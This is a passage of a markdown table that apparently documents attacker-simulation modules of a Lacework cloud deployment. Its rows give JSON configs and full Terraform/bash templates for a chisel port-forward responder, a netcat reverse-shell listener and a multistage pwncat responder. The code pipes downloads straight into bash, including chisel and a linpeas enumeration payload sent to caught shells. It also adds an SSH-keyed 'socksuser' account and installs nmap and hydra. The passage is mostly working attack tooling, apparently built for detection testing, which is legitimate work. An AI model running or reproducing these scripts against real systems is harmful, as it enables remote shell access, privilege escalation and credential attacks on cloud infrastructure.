60<br/>        done<br/>        log &#x27;waiting 30 minutes\.\.\.&#x27;;<br/>        sleep 1800<br/>        if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>            log &quot;payload update detected \- exiting loop and forcing payload download&quot;<br/>            rm \-f /tmp/payload\_$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop\.\.\.&quot;<br/>        fi<br/>    done<br/>    EOT<br/><br/>    app = base64encode\(templatefile\(<br/>                &quot;$\{path\.module\}/resources/app\.py\.tpl&quot;,<br/>                \{<br/>                    listen\_port = var\.inputs\[&quot;listen\_port&quot;\]<br/>                \}\)\)<br/>    <br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &quot;&quot;<br/>        apt\_packages = &quot;curl&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &quot;&quot;<br/>        yum\_packages = &quot;curl&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| attacker-runbook-responder-port-forward                  | ./modules/runbook/responder-port-forward             | runbook_exec_responder_port_forward              | context.azure.runbook.attacker.responder.port_forward             | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;attacker&quot;: {<br/>                    &quot;responder&quot;: {<br/>                        &quot;port_forward&quot;: {<br/>                            &quot;enabled&quot;: false,<br/>                            &quot;listen_port&quot;: 8888<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/responder-port-forward             | <pre>locals \{<br/>    listen\_port = var\.inputs\[&quot;listen\_port&quot;\]<br/>    payload = &lt;&lt;\-EOT<br/>    START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk &#x27;\{ print $1 \}&#x27;\)<br/>    while true; do<br/>        killall \-9 chisel<br/>        truncate \-s 0 /tmp/chisel\.log<br/>        log &quot;checking for chisel\.\.\.&quot;<br/>        while \! command \-v chisel; do<br/>            log &quot;chisel not found \- installing&quot;<br/>            curl https://i\.jpillora\.com/chisel\! \| bash<br/>            sleep 10<br/>        done<br/>        log &quot;chisel: $\(command \-v  chisel\)&quot;<br/>        /usr/local/bin/chisel server \-v \-p $\{local\.listen\_port\} &gt; /tmp/chisel\.log 2&gt;&amp;1 &amp;<br/>        log &quot;responder started\.\.\.&quot;<br/>        log &#x27;waiting 30 minutes\.\.\.&#x27;;<br/>        sleep 1800<br/>        if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>            log &quot;payload update detected \- exiting loop and forcing payload download&quot;<br/>            rm \-f /tmp/payload\_$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop\.\.\.&quot;<br/>        fi<br/>    done<br/>    EOT<br/><br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &quot;&quot;<br/>        apt\_packages = &quot;&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &quot;&quot;<br/>        yum\_packages = &quot;&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          |
| attacker-runbook-responder-reverse-shell                 | ./modules/runbook/responder-reverse-shell            | runbook_exec_responder_reverse_shell             | context.azure.runbook.attacker.responder.reverse_shell            | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;attacker&quot;: {<br/>                    &quot;responder&quot;: {<br/>                        &quot;reverse_shell&quot;: {<br/>                            &quot;enabled&quot;: false,<br/>                            &quot;listen_ip&quot;: &quot;0.0.0.0&quot;,<br/>                            &quot;listen_port&quot;: 4444,<br/>                            &quot;payload&quot;: &quot;curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files&quot;<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/responder-reverse-shell            | <pre>locals \{<br/>    listen\_port = var\.inputs\[&quot;listen\_port&quot;\]<br/>    listen\_ip = var\.inputs\[&quot;listen\_ip&quot;\]<br/>    base64\_command\_payload = base64encode\(var\.inputs\[&quot;payload&quot;\]\)<br/>    payload = &lt;&lt;\-EOT<br/>    START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk &#x27;\{ print $1 \}&#x27;\)<br/>    while true; do<br/>        screen \-S netcat \-X quit<br/>        screen \-wipe<br/>        truncate \-s 0 /tmp/netcat\.log<br/>        screen \-d \-L \-Logfile /tmp/netcat\.log \-S netcat \-m nc \-vv \-nl $\{local\.listen\_ip\} $\{local\.listen\_port\}<br/>        screen \-S netcat \-X colon &quot;logfile flush 0^M&quot;<br/>        log &quot;listener started\.\.&quot;<br/>        until tail /tmp/netcat\.log \| grep \-m 1 &quot;Connection received&quot;; do<br/>            log &quot;waiting for connection\.\.\.&quot;;<br/>            sleep 10;<br/>        done<br/>        sleep 30<br/>        log &#x27;sending screen command: $\{var\.inputs\[&quot;payload&quot;\]\}&#x27;;<br/>        screen \-S netcat \-p 0 \-X stuff &quot;echo &#x27;$\{local\.base64\_command\_payload\}&#x27; \| base64 \-d \| /bin/bash \-^M&quot;<br/>        log &quot;responder started\.\.\.&quot;<br/>        log &#x27;waiting 10 minutes\.\.\.&#x27;;<br/>        sleep 600<br/>        if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>            log &quot;payload update detected \- exiting loop and forcing payload download&quot;<br/>            rm \-f /tmp/payload\_$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop\.\.\.&quot;<br/>        fi<br/>    done<br/>    EOT<br/>    <br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &quot;&quot;<br/>        apt\_packages = &quot;&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &quot;&quot;<br/>        yum\_packages = &quot;&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
| attacker-runbook-responder-reverse-shell-multistage      | ./modules/runbook/responder-reverse-shell-multistage | runbook_exec_reverse_shell_multistage_attacker   | context.azure.runbook.attacker.responder.reverse_shell_multistage | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;attacker&quot;: {<br/>                    &quot;responder&quot;: {<br/>                        &quot;reverse_shell_multistage&quot;: {<br/>                            &quot;attack_delay&quot;: 50400,<br/>                            &quot;enabled&quot;: false,<br/>                            &quot;iam2rds_role_name&quot;: &quot;rds_user_access_role_ciemdemo&quot;,<br/>                            &quot;iam2rds_session_name&quot;: &quot;attacker-session&quot;,<br/>                            &quot;listen_ip&quot;: &quot;0.0.0.0&quot;,<br/>                            &quot;listen_port&quot;: 4444,<br/>                            &quot;payload&quot;: &quot;curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files&quot;,<br/>                            &quot;reverse_shell_host&quot;: null<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                  | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/responder-reverse-shell-multistage | <pre>locals \{<br/>    listen\_port = var\.inputs\[&quot;listen\_port&quot;\]<br/>    listen\_ip = var\.inputs\[&quot;listen\_ip&quot;\]<br/>    attack\_dir = &quot;/pwncat&quot;<br/>    payload = &lt;&lt;\-EOT<br/>    PWNCAT\_LOG=&quot;/tmp/pwncat\.log&quot;<br/>    PWNCAT\_SESSION=&quot;pwncat&quot;<br/>    PWNCAT\_SESSION\_LOCK=&quot;/tmp/pwncat\_session\.lock&quot;<br/>    if \[ \-e &quot;$PWNCAT\_SESSION\_LOCK&quot; \]  &amp;&amp; screen \-ls \| grep \-q &quot;$PWNCAT\_SESSION&quot;; then<br/>        log &quot;Pwncat session lock $PWNCAT\_SESSION\_LOCK exists and pwncat screen session running\. Skipping setup\.&quot;<br/>    else<br/>        rm \-f &quot;$PWNCAT\_SESSION\_LOCK&quot;<br/>        log &quot;Session lock doesn&#x27;t exist and screen session not runing\. Continuing\.\.\.&quot;<br/>        log &quot;setting up reverse shell listener: $\{local\.listen\_ip\}:$\{local\.listen\_port\}&quot;<br/>        screen \-S $PWNCAT\_SESSION \-X quit<br/>        screen \-wipe<br/>        log &quot;cleaning app directory&quot;<br/>        rm \-rf $\{local\.attack\_dir\}<br/>        mkdir \-p $\{local\.attack\_dir\}/plugins $\{local\.attack\_dir\}/resources<br/>        cd $\{local\.attack\_dir\}<br/>        echo $\{base64gzip\(local\.listener\)\} \| base64 \-d \| gunzip &gt; listener\.py<br/>        echo $\{base64gzip\(local\.responder\)\} \| base64 \-d \| gunzip &gt; plugins/responder\.py<br/>        echo $\{base64gzip\(local\.instance2rds\)\} \| base64 \-d \| gunzip &gt; resources/instance2rds\.sh<br/>        echo $\{base64gzip\(local\.iam2rds\)\} \| base64 \-d \| gunzip &gt; resources/iam2rds\.sh<br/>        echo $\{base64gzip\(local\.azureiam2azuresql\)\} \| base64 \-d \| gunzip &gt; resources/azureiam2azuresql\.sh<br/>        echo $\{base64gzip\(local\.gcpiam2cloudsql\)\} \| base64 \-d \| gunzip &gt; resources/gcpiam2cloudsql\.sh<br/>        echo $\{base64gzip\(local\.scan2kubeshell\)\} \| base64 \-d \| gunzip &gt; resources/scan2kubeshell\.sh<br/>        echo $\{base64gzip\(local\.kube2s3\)\} \| base64 \-d \| gunzip &gt; resources/kube2s3\.sh <br/>        echo $\{base64gzip\(local\.iam2enum\)\} \| base64 \-d \| gunzip &gt; resources/iam2enum\.sh<br/>        log &quot;installing required python3\.9\.\.\.&quot;<br/>        apt\-get install \-y python3\.9 python3\.9\-venv &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        curl https://bootstrap\.pypa\.io/get\-pip\.py \-o get\-pip\.py &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        python3\.9 get\-pip\.py &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        log &quot;wait before using module\.\.\.&quot;<br/>        sleep 5<br/>        python3\.9 \-m pip install \-U pip setuptools wheel setuptools\_rust jinja2 jc &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        python3\.9 \-m pip install \-U pwncat\-cs &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        log &quot;wait before using module\.\.\.&quot;<br/>        sleep 5<br/>        if \! \[ \-e /home/socksuser/\.ssh/socksuser\_key \]; then<br/>            log &quot;adding tunneled port scanning user \- socksuser\.\.\.&quot;<br/>            adduser \-\-gecos &quot;&quot; \-\-disabled\-password &quot;socksuser&quot; \|\| log &quot;socksuser user already exists&quot;<br/>            log &quot;adding ssh keys for socks user\.\.\.&quot;<br/>            mkdir \-p /home/socksuser/\.ssh 2&gt;&amp;1 \| tee \-a $LOGFILE<br/>            ssh\-keygen \-t rsa \-N &#x27;&#x27; \-b 4096 \-f /home/socksuser/\.ssh/socksuser\_key 2&gt;&amp;1 \| tee \-a $LOGFILE<br/>            cat /home/socksuser/\.ssh/socksuser\_key\.pub &gt;&gt; /home/socksuser/\.ssh/authorized\_keys 2&gt;&amp;1 \| tee \-a $LOGFILE<br/>            chown \-R socksuser:socksuser /home/socksuser<br/>            chmod 600 /home/socksuser/\.ssh/authorized\_keys 2&gt;&amp;1 \| tee \-a $LOGFILE<br/>            log &quot;socksuser setup complete\.\.\.&quot;<br/>        fi<br/>        START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk &#x27;\{ print $1 \}&#x27;\)<br/>        while true; do<br/>            for i in \`seq $\(\(MAXLOG\-1\)\) \-1 1\`; do mv &quot;$PWNCAT\_LOG\.&quot;\{$i,$\(\(i\+1\)\)\} 2&gt;/dev/null \|\| true; done<br/>            mv $PWNCAT\_LOG &quot;$PWNCAT\_LOG\.1&quot; 2&gt;/dev/null \|\| true<br/>            log &quot;starting background process via screen\.\.\.&quot;<br/>            screen \-S $PWNCAT\_SESSION \-X quit<br/>            screen \-wipe<br/>            screen \-d \-L \-Logfile $PWNCAT\_LOG \-S $PWNCAT\_SESSION \-m /bin/bash \-c &quot;cd $\{local\.attack\_dir\} &amp;&amp; python3\.9 listener\.py \-\-port=\\&quot;$\{var\.inputs\[&quot;reverse\_shell\_port&quot;\]\}\\&quot; \-\-host=\\&quot;$\{var\.inputs\[&quot;reverse\_shell\_host&quot;\]\}\\&quot; \-\-payload=\\&quot;$\{var\.inputs\[&quot;payload&quot;\]\}\\&quot;&quot;<br/>            screen \-S $PWNCAT\_SESSION \-X colon &quot;logfile flush 0^M&quot;<br/>            log &quot;Checking for listener\.\.\.&quot;<br/>            TIMEOUT=1800<br/>            START\_TIME=$\(date \+%s\)<br/>            while true; do<br/>                CURRENT\_TIME=$\(date \+%s\)<br/>                ELAPSED\_TIME=$\(\(CURRENT\_TIME \- START\_TIME\)\)<br/>                if grep &quot;listener created&quot; $PWNCAT\_LOG; then<br/>                    log &quot;Found listener created log in $PWNCAT\_LOG \- checking for port response&quot;<br/>                    while \! nc \-z \-w 5 \-vv 127\.0\.0\.1 $\{local\.listen\_port\} &gt; /dev/null; do<br/>                        log &quot;failed check \- waiting for pwncat port response: 127\.0\.0\.1:$\{local\.listen\_port\}&quot;;<br/>                        sleep 30;<br/>                        if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>                            log &quot;payload update detected \- exiting loop and forcing payload download&quot;<br/>                            rm \-f /tmp/payload\_$SCRIPTNAME<br/>                            break 3<br/>                        fi<br/>                    done;<br/>                    log &quot;Sucessfully connected to 127\.0\.0\.1:$\{local\.listen\_port\}&quot;<br/>                    break<br/>                fi<br/>                if \[ $ELAPSED\_TIME \-gt $TIMEOUT \]; then<br/>                    log &quot;Failed to find listener created log for pwncat \- timeout after $TIMEOUT seconds&quot;<br/>                    exit 1<br/>                fi<br/>            done<br/>            log &quot;responder started\.&quot;<br/>            log &quot;starting sleep for 30 minutes \- blocking new tasks while accepting connections\.\.\.&quot;<br/>            sleep 1800<br/>            log &quot;sleep complete \- checking for running sessions\.\.\.&quot;<br/>            while \[ \-e &quot;$PWNCAT\_SESSION\_LOCK&quot; \]  &amp;&amp; screen \-ls \| grep \-q &quot;$PWNCAT\_SESSION&quot;; do<br/>                log &quot;pwncat session still running \- waiting before restart\.\.\.&quot;<br/>                sleep 600<br/>            done<br/>            log &quot;no pwncat sessions found \- continuing\.\.\.&quot;<br/>            if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>                log &quot;payload update detected \- exiting loop and forcing payload download&quot;<br/>                rm \-f /tmp/payload\_$SCRIPTNAME<br/>                break<br/>            else<br/>                log &quot;restarting loop\.\.\.&quot;<br/>            fi<br/>        done<br/>    fi<br/>    log &quot;done\.&quot;<br/>    EOT<br/><br/>    listener        = file\(&quot;$\{path\.module\}/resources/listener\.py&quot;\)<br/>    responder       = file\(&quot;$\{path\.module\}/resources/responder\.py&quot;\)<br/>    instance2rds    = templatefile\(<br/>                                &quot;$\{path\.module\}/resources/instance2rds\.sh&quot;, <br/>                                \{<br/>                                    region = var\.inputs\[&quot;region&quot;\],<br/>                                    environment = var\.inputs\[&quot;environment&quot;\],<br/>                                    deployment = var\.inputs\[&quot;deployment&quot;\]<br/>                                \}<br/>                            \)<br/><br/>    iam2rds         = templatefile\(<br/>                                &quot;$\{path\.module\}/resources/iam2rds\.sh&quot;, <br/>                                \{<br/>                                    region = var\.inputs\[&quot;region&quot;\],<br/>                                    environment = var\.inputs\[&quot;environment&quot;\],<br/>                                    deployment = var\.inputs\[&quot;deployment&quot;\],<br/>                                    iam2rds\_role\_name = var\.inputs\[&quot;iam2rds\_role\_name&quot;\]<br/>                                    iam2rds\_session\_name = &quot;$\{var\.inputs\[&quot;iam2rds\_session\_name&quot;\]\}\-$\{var\.inputs\[&quot;deployment&quot;\]\}&quot;<br/>                                \}<br/>                            \)<br/>    <br/>    iam2enum = file\(&quot;$\{path\.module\}/resources/iam2enum\.sh&quot;\)<br/>                            <br/>    azureiam2azuresql = file\(&quot;$\{path\.module\}/resources/azureiam2azuresql\.sh&quot;\)                            <br/><br/>    gcpiam2cloudsql = file\(&quot;$\{path\.module\}/resources/gcpiam2cloudsql\.sh&quot;\)<br/><br/>    scan2kubeshell = file\(&quot;$\{path\.module\}/resources/scan2kubeshell\.sh&quot;\)<br/>    <br/>    kube2s3 = file\(&quot;$\{path\.module\}/resources/kube2s3\.sh&quot;\)<br/><br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &quot;&quot;<br/>        apt\_packages = &quot;proxychains4 nmap hydra python3\-pip&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &lt;&lt;\-EOT<br/>        if \! command \-v proxychains4 &gt; /dev/null \|\| \! command \-v hydra &gt; /dev/null \|\| \! command \-v hydra &gt; /dev/null; then<br/>            yum update \-y<br/>            yum install \-y git<br/>            yum groupinstall \-y &#x27;Development Tools&#x27;<br/>            \# proxychains4<br/>            cd /usr/local/src<br/>            git clone https://github\.com/rofl0r/proxychains\-ng<br/>            cd proxychains\-ng<br/>            \./configure &amp;&amp; make &amp;&amp; make install<br/>            make install\-config<br/>            \# hydra<br/>            cd /usr/local/src<br/>            git clone https://github\.com/vanhauser\-thc/thc\-hydra<br/>            cd thc\-hydra<br/>            \./configure &amp;&amp; make &amp;&amp; make install<br/>        fi<br/>        EOT<br/>        yum\_packages = &quot;nmap python3\-pip&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[<br/>            \{<br/>                name = &quot;$\{basename\(abspath\(path\.module\)\)\}\_instance2rds\.sh&quot;<br/>                content = base64encode\(local\.instance2rds\)<br/>            \},<br/>            \{<br/>                name = &quot;$\{basename\(abspath\(path\.module\)\)\}\_iam2rds\.sh&quot;<br/>                content = base64encode\(local\.iam2rds\)<br/>            \},<br/>            \{<br/>                name = &quot;$\{basename\(abspath\(path\.module\)\)\}\_scan2kubeshell\.sh&quot;<br/>                content = base64encode\(local\.scan2kubeshell\)<br/>            \},<br/>            \{<br/>                name = &quot;$\{basename\(abspath\(path\.module\)\)\}\_kube2s3\.sh&quot;<br/>                content = base64encode\(local\.kube2s3\)<br/>            \},<br/>            \{<br/>                name = &quot;$\{basename\(abspath\(path\.module\)\)\}\_gcpiam2cloudsql\.sh&quot;<br/>                content = base64encode\(local\.gcpiam2cloudsql\)<br/>            \},<br/>            \{<br/>                name = &quot;$\{basename\(abspath\(path\.module\)\)\}\_iam2enum\.sh&quot;<br/>                content = base64encode\(local\.iam2enum\)<br/>            \}<br/>        \]<br/>    \}<br/>\}</pre> |
| attacker-runbook-responder-reverse-shell                 | ./modules/runbook/responder-reverse-shell            | runbook_exec_responder_reverse_shell             | context.azure.runbook.attacker.responder.reverse_shell            | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;attacker&quot;: {<br/>                    &quot;responder&quot;: {<br/>                        &quot;reverse_shell&quot;: {<br/>                            &quot;enabled&quot;: false,<br/>                            &quot;listen_ip&quot;: &quot;0.0.0.0&quot;,<br/>                            &quot;listen_port&quot;: 4444,<br/>                            &quot;payload&quot;: &quot;curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files&quot;<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/responder-reverse-shell            | <pre>locals \{<br/>    listen\_port = var\.inputs\[&quot;listen\_port&quot;\]<br/>    listen\_ip = var\.inputs\[&quot;listen\_ip&quot;\]<br/>    base64\_command\_payload = base64encode\(var\.inputs\[&quot;payload&quot;\]\)<br/>    payload = &lt;&lt;\-EOT<br/>    START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk &#x27;\{ print $1 \}&#x27;\)<br/>    while true; do<br/>        screen \-S netcat \-X quit<br/>        screen \-wipe<br/>        truncate \-s 0 /tmp/netcat\.log<br/>        screen \-d \-L \-Logfile /tmp/netcat\.log \-S netcat \-m nc \-vv \-nl $\{local\.listen\_ip\} $\{local\.listen\_port\}<br/>        screen \-S netcat \-X colon &quot;logfile flush 0^M&quot;<br/>        log &quot;listener started\.\.&quot;<br/>        until tail /tmp/netcat\.log \| grep \-m 1 &quot;Connection received&quot;; do<br/>            log &quot;waiting for connection\.\.\.&quot;;<br/>            sleep 10;<br/>        done<br/>        sleep 30<br/>        log &#x27;sending screen command: $\{var\.inputs\[&quot;payload&quot;\]\}&#x27;;<br/>        screen \-S netcat \-p 0 \-X stuff &quot;echo &#x27;$\{local\.base64\_command\_payload\}&#x27; \| base64 \-d \| /bin/bash \-^M&quot;<br/>        log &quot;responder started\.\.\.&quot;<br/>        log &#x27;waiting 10 minutes\.\.\.&#x27;;<br/>        sleep 600<br/>        if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>            log &quot;payload update detected \- exiting loop and forcing payload download&quot;<br/>            rm \-f /tmp/payload\_$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop\.\.\.&quot;<br/>        fi<br/>    done<br/>    EOT<br/>    <br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &quot;&quot;<br/>        apt\_packages = &quot;&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &quot;&quot;<br/>        yum\_packages = &quot;&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |